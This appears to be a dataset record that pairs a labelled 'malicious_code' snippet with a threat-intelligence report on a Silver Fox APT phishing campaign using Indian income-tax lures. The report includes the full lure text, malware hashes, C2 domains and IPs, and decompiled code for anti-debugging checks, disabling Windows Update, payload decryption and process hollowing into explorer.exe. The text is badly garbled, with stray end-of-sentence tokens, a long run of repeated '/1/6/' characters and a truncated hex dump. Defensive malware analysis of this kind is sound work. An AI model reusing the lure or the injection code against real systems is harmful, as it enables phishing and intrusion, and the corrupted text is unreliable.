particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "CreateThread(0,0,StartAddress,0,0,0);sub_10003E6E(v13);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "if (!CreateProcessA( \n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n0, \n0, \n0, \n0, \nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n0, \n0, \n&StartupInfo, \n&ProcessInformation) )", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><